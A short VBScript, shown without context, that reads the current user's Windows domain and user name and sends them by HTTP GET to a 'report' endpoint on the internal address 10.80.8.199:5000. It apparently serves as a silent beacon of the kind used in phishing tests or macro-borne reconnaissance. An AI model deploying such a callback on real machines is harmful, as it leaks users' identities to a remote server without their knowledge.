Set http = CreateObject("MSXML2.ServerXMLHTTP")
who = CreateObject("WScript.Network").UserDomain & "\" & CreateObject("WScript.Network").UserName
http.Open "GET", "http://10.80.8.199:5000/report?who=" & who, False
http.Send